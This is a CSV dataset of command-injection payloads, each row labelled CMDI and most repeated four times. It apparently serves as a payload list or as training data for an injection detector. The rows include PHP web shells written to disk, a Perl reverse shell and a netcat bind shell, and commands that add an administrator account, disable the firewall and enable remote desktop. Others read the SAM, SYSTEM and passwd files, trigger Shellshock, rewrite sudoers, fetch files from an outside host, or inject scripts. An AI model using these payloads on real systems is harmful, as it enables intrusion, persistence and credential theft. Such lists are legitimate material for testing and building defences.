payload,attack
"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc"");?>",CMDI
"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc"");?>",CMDI
"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc"");?>",CMDI
"<?php system(""wget https://crowdshield.com/.testing/rce_vuln.txt?req=jdfj2jc"");?>",CMDI
"<?php system($_GET[""cmd""]) ?>",CMDI
<{cmd}%0A,CMDI
<{cmd}%0D,CMDI
"<% eval request(""cmd"") %>",CMDI
"<% Runtime.getruntime().exec(request.getParameter(""cmd"")) %>",CMDI
<<< %s(un='%s') = %u,CMDI
| curl http://crowdshield.com/.testing/rce.txt,CMDI
| curl http://crowdshield.com/.testing/rce.txt,CMDI
| curl http://crowdshield.com/.testing/rce.txt,CMDI
| curl http://crowdshield.com/.testing/rce.txt,CMDI
| dir C:\Documents and Settings\*,CMDI
| dir C:\Documents and Settings\*,CMDI
| dir C:\Documents and Settings\*,CMDI
| dir C:\Documents and Settings\*,CMDI
| dir C:\Users,CMDI
| dir C:\Users,CMDI
| dir C:\Users,CMDI
| dir C:\Users,CMDI
"| echo ""<?php include($_GET['page'])| ?>"" > rfi.php",CMDI
"| echo ""<?php include($_GET['page'])| ?>"" > rfi.php",CMDI
"| echo ""<?php include($_GET['page'])| ?>"" > rfi.php",CMDI
"| echo ""<?php include($_GET['page'])| ?>"" > rfi.php",CMDI
"| echo ""<?php system('dir $_GET['dir']')| ?>"" > dir.php ",CMDI
"| echo ""<?php system('dir $_GET['dir']')| ?>"" > dir.php ",CMDI
"| echo ""<?php system('dir $_GET['dir']')| ?>"" > dir.php ",CMDI
"| echo ""<?php system('dir $_GET['dir']')| ?>"" > dir.php ",CMDI
"| echo ""<?php system($_GET['cmd'])| ?>"" > cmd.php",CMDI
"| echo ""<?php system($_GET['cmd'])| ?>"" > cmd.php",CMDI
"| echo ""<?php system($_GET['cmd'])| ?>"" > cmd.php",CMDI
"| echo ""<?php system($_GET['cmd'])| ?>"" > cmd.php",CMDI
"| echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
"| echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
"| echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
"| echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">;S"");open(STDOUT,"">;S"");open(STDERR,"">;S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
| ls -l /home/*,CMDI
| ls -l /home/*,CMDI
| ls -l /home/*,CMDI
| ls -l /home/*,CMDI
| ls -l /tmp,CMDI
| ls -l /tmp,CMDI
| ls -l /tmp,CMDI
| ls -l /tmp,CMDI
| ls -l /var/www/*,CMDI
| ls -l /var/www/*,CMDI
| ls -l /var/www/*,CMDI
| ls -l /var/www/*,CMDI
| ls -laR /etc,CMDI
| ls -laR /etc,CMDI
| ls -laR /etc,CMDI
| ls -laR /etc,CMDI
| ls -laR /var/www,CMDI
| ls -laR /var/www,CMDI
| ls -laR /var/www,CMDI
| ls -laR /var/www,CMDI
| nc -lvvp 4444 -e /bin/sh|,CMDI
| nc -lvvp 4444 -e /bin/sh|,CMDI
| nc -lvvp 4444 -e /bin/sh|,CMDI
| nc -lvvp 4444 -e /bin/sh|,CMDI
| net localgroup Administrators hacker /ADD,CMDI
| net localgroup Administrators hacker /ADD,CMDI
| net localgroup Administrators hacker /ADD,CMDI
| net localgroup Administrators hacker /ADD,CMDI
| net user hacker Password1 /ADD,CMDI
| net user hacker Password1 /ADD,CMDI
| net user hacker Password1 /ADD,CMDI
| net user hacker Password1 /ADD,CMDI
| netsh firewall set opmode disable,CMDI
| netsh firewall set opmode disable,CMDI
| netsh firewall set opmode disable,CMDI
| netsh firewall set opmode disable,CMDI
"| perl -e 'print ""X""x16096'",CMDI
"| perl -e 'print ""X""x16096'",CMDI
"| perl -e 'print ""X""x16096'",CMDI
"| perl -e 'print ""X""x16096'",CMDI
"| perl -e 'print ""X""x4096'",CMDI
"| perl -e 'print ""X""x4096'",CMDI
"| perl -e 'print ""X""x4096'",CMDI
"| perl -e 'print ""X""x4096'",CMDI
"| perl -e 'print ""X""x8096'",CMDI
"| perl -e 'print ""X""x8096'",CMDI
"| perl -e 'print ""X""x8096'",CMDI
"| perl -e 'print ""X""x8096'",CMDI
"| reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
"| reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
"| reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
"| reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f",CMDI
| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
| system('sleep 5');,CMDI
| system('sleep 5');,CMDI
| system('sleep 5');,CMDI
| system('sleep 5');,CMDI
| systeminfo,CMDI
| systeminfo,CMDI
| systeminfo,CMDI
| systeminfo,CMDI
| type %SYSTEMROOT%\repair\SAM,CMDI
| type %SYSTEMROOT%\repair\SAM,CMDI
| type %SYSTEMROOT%\repair\SAM,CMDI
| type %SYSTEMROOT%\repair\SAM,CMDI
| type %SYSTEMROOT%\repair\SYSTEM,CMDI
| type %SYSTEMROOT%\repair\SYSTEM,CMDI
| type %SYSTEMROOT%\repair\SYSTEM,CMDI
| type %SYSTEMROOT%\repair\SYSTEM,CMDI
| type C:\Windows\repair\SAM,CMDI
| type C:\Windows\repair\SAM,CMDI
| type C:\Windows\repair\SAM,CMDI
| type C:\Windows\repair\SAM,CMDI
| type C:\Windows\repair\SYSTEM,CMDI
| type C:\Windows\repair\SYSTEM,CMDI
| type C:\Windows\repair\SYSTEM,CMDI
| type C:\Windows\repair\SYSTEM,CMDI
| type C:\WINNT\repair\SAM,CMDI
| type C:\WINNT\repair\SAM,CMDI
| type C:\WINNT\repair\SAM,CMDI
| type C:\WINNT\repair\SAM,CMDI
| wget http://crowdshield.com/.testing/rce.txt,CMDI
| wget http://crowdshield.com/.testing/rce.txt,CMDI
| wget http://crowdshield.com/.testing/rce.txt,CMDI
| wget http://crowdshield.com/.testing/rce.txt,CMDI
|+ping+|',CMDI
"|| perl -e 'print ""X""x16096'",CMDI
"|| perl -e 'print ""X""x16096'",CMDI
"|| perl -e 'print ""X""x16096'",CMDI
"|| perl -e 'print ""X""x16096'",CMDI
"|| perl -e 'print ""X""x4096'",CMDI
"|| perl -e 'print ""X""x4096'",CMDI
"|| perl -e 'print ""X""x4096'",CMDI
"|| perl -e 'print ""X""x4096'",CMDI
"|| perl -e 'print ""X""x8096'",CMDI
"|| perl -e 'print ""X""x8096'",CMDI
"|| perl -e 'print ""X""x8096'",CMDI
"|| perl -e 'print ""X""x8096'",CMDI
|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
|| system('curl https://crowdshield.com/.testing/rce_vuln.txt');,CMDI
|| system('sleep 5');,CMDI
|| system('sleep 5');,CMDI
|| system('sleep 5');,CMDI
|| system('sleep 5');,CMDI
||/usr/bin/id;,CMDI
||/usr/bin/id;,CMDI
||/usr/bin/id;,CMDI
||/usr/bin/id;,CMDI
||/usr/bin/id|,CMDI
||/usr/bin/id|,CMDI
||/usr/bin/id|,CMDI
||/usr/bin/id|,CMDI
||/usr/bin/id|',CMDI
||+dir|c:\,CMDI
||echo%20ANSBHE$((26%2B89))$(echo%20ANSBHE)ANSBHE,CMDI
"||echo%20RWZHCR$((74%2B28))$(echo%20RWZHCR)RWZHCR""",CMDI
||echo%20XIYAUA$((17%2B90))$(echo%20XIYAUA)XIYAUA',CMDI
|CMD=$'{cmd}';$CMD,CMDI
"|CMD=$""{cmd}"";$CMD",CMDI
|CMD=$\'{cmd}\';$CMD,CMDI
|echo%20DDLJJW$((33%2B23))$(echo%20DDLJJW)DDLJJW',CMDI
"|echo%20PRCGGO$((57%2B79))$(echo%20PRCGGO)PRCGGO""",CMDI
|echo%20TJEGSE$((27%2B57))$(echo%20TJEGSE)TJEGSE,CMDI
|usr/bin/id\n,CMDI
|usr/bin/id\n,CMDI
|usr/bin/id\n,CMDI
|usr/bin/id\n,CMDI
$;/usr/bin/id,CMDI
$;/usr/bin/id,CMDI
$;/usr/bin/id,CMDI
$;/usr/bin/id,CMDI
$;/usr/bin/id,CMDI
$;/usr/bin/id,CMDI
$;/usr/bin/id,CMDI
$;/usr/bin/id,CMDI
$(`cat /etc/passwd`),CMDI
$(`cat /etc/passwd`),CMDI
$(`cat /etc/passwd`),CMDI
$(`cat /etc/passwd`),CMDI
$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),CMDI
$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),CMDI
$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),CMDI
$(`curl https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),CMDI
$(`dir`),CMDI
$(`dir`),CMDI
$(`dir`),CMDI
$(`dir`),CMDI
$(`ls`),CMDI
$(`ls`),CMDI
$(`ls`),CMDI
$(`ls`),CMDI
$(`type C:\boot.ini`),CMDI
$(`type C:\boot.ini`),CMDI
$(`type C:\boot.ini`),CMDI
$(`type C:\boot.ini`),CMDI
$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),CMDI
$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),CMDI
$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),CMDI
$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),CMDI
$(`wget https://crowdshield.com/.testing/rce_vuln.txt`),CMDI
$(`wget https://crowdshield.com/.testing/rce_vuln.txt`),CMDI
$(`wget https://crowdshield.com/.testing/rce_vuln.txt`),CMDI
$(`wget https://crowdshield.com/.testing/rce_vuln.txt`),CMDI
$(`whoami`),CMDI
$(`whoami`),CMDI
$(`whoami`),CMDI
$(`whoami`),CMDI
$(touch /tmp/blns.fail),CMDI
"${@print(""RCEVulnerable"")}",CMDI
"${@print(""RCEVulnerable"")}",CMDI
"${@print(""RCEVulnerable"")}",CMDI
"${@print(""RCEVulnerable"")}",CMDI
${@print(system($_SERVER['HTTP_USER_AGENT']))},CMDI
${@print(system($_SERVER['HTTP_USER_AGENT']))},CMDI
${@print(system($_SERVER['HTTP_USER_AGENT']))},CMDI
${@print(system($_SERVER['HTTP_USER_AGENT']))},CMDI
$%26%26dir c:\,CMDI
$%26%26dir+c:%255c,CMDI
$%26%26dir+c:%2f,CMDI
$+|+Dir+c:\,CMDI
$+|+Dir+c:%255c,CMDI
$+|+Dir+c:%2f,CMDI
$ENV{'HOME'},CMDI
cat /etc/hosts,CMDI
cat /etc/hosts,CMDI
cat /etc/hosts,CMDI
cat /etc/hosts,CMDI
cat /etc/passwd,CMDI
cat /etc/passwd,CMDI
cat /etc/passwd,CMDI
cat /etc/passwd,CMDI
CMD=$'{cmd}';$CMD,CMDI
"CMD=$""{cmd}"";$CMD",CMDI
CMD=$\'{cmd}\';$CMD,CMDI
"Cookie: () { echo ""Hello world""; }",CMDI
curl https://crowdshield.com/.testing/rce_vuln.txt,CMDI
curl https://crowdshield.com/.testing/rce_vuln.txt,CMDI
curl https://crowdshield.com/.testing/rce_vuln.txt,CMDI
curl https://crowdshield.com/.testing/rce_vuln.txt,CMDI
"curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",CMDI
"curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",CMDI
"curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",CMDI
"curl https://crowdshield.com/.testing/rce_vuln.txt ||`curl https://crowdshield.com/.testing/rce_vuln.txt` #' |curl https://crowdshield.com/.testing/rce_vuln.txt||`curl https://crowdshield.com/.testing/rce_vuln.txt` #\"" |curl https://crowdshield.com/.testing/rce_vuln.txt",CMDI
"data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4='",CMDI
echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX,CMDI
echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX,CMDI
echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX,CMDI
echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX,CMDI
echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX,CMDI
echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX,CMDI
echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX,CMDI
echo '<script src=https://crowdshield.com/.testing/xss.js></script>'// XXXXXXXXXXX,CMDI
echo '<script>alert(1)</script>'// XXXXXXXXXXX,CMDI
echo '<script>alert(1)</script>'// XXXXXXXXXXX,CMDI
echo '<script>alert(1)</script>'// XXXXXXXXXXX,CMDI
echo '<script>alert(1)</script>'// XXXXXXXXXXX,CMDI
"echo ""<?php include($_GET['page']); ?>"" > rfi.php",CMDI
"echo ""<?php include($_GET['page']); ?>"" > rfi.php",CMDI
"echo ""<?php include($_GET['page']); ?>"" > rfi.php",CMDI
"echo ""<?php include($_GET['page']); ?>"" > rfi.php",CMDI
"echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",CMDI
"echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",CMDI
"echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",CMDI
"echo ""<?php system('dir $_GET['dir']'); ?>"" > dir.php",CMDI
"echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CMDI
"echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CMDI
"echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CMDI
"echo ""<?php system($_GET['cmd']); ?>"" > cmd.php",CMDI
"echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
"echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
"echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
"echo ""use Socket;$i=""192.168.16.151"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};"" > rev.pl",CMDI
"echo python -c '""import os;os.write(3,\""ALL ALL=(ALL) NOPASSWD: ALL\"")""'|DYLD_PRINT_TO_FILE=/etc/sudoers newgrp;sudo su",CMDI
echo%20AGIYMZ$((69%2B52))$(echo%20AGIYMZ)AGIYMZ,CMDI
"echo%20GHWFXG$((12%2B72))$(echo%20GHWFXG)GHWFXG""",CMDI
echo%20IFNPXI$((40%2B99))$(echo%20IFNPXI)IFNPXI',CMDI
"env 'x=() { :;}; echo vulnerable' 'BASH_FUNC_x()=() { :;}; echo vulnerable' bash -c ""echo test""",CMDI
"env x='() { :;}; apt-get update && apt-get install --only-upgrade bash' bash -c ""Oops.""",CMDI
eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),CMDI
eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),CMDI
eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),CMDI
